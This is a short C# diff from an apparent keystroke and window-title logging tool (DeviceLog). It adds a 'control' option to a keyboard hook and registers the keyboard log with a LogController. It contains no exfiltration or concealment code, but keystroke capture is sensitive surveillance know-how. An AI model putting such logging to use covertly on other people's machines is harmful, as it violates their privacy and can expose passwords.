@@ -12,11 +12,14 @@ namespace DeviceLog.Classes.Modules.Keyboard
         private readonly bool _windowTitle;
         private readonly WindowModule _windowModule;
 
-        internal KeyboardModule(bool special, bool keyUp, bool keyDown, bool windowTitle)
+        private readonly LogController _logController;
+
+        internal KeyboardModule(bool special, bool control, bool keyUp, bool keyDown, bool windowTitle, LogController logController)
         {
-            _keyboardHook = new KeyboardHook(special);
+            _keyboardHook = new KeyboardHook(special, control);
             _log = new KeyboardLog();
             _windowModule = new WindowModule();
+            _logController = logController;
 
             _currentWindowTitle = "";
             _windowTitle = windowTitle;
@@ -30,6 +33,8 @@ namespace DeviceLog.Classes.Modules.Keyboard
             {
                 _keyboardHook.KeyDown += KeyPress;
             }
+
+            _logController.AddLog(_log);
         }
 
         private void KeyPress(string key)
